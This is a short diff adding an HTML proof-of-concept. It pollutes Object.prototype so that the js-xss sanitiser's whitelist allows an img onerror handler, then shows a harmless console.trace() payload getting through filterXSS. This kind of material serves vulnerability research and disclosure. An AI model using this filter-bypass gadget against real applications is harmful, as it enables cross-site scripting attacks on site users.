@@ -1,0 +1,7 @@
+<script src="https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js"></script>
+<script>
+  Object.prototype.whiteList = {img: ['onerror', 'src']}
+</script>
+<script>
+  document.write(filterXSS('<img src onerror=console.trace()>'))
+</script>
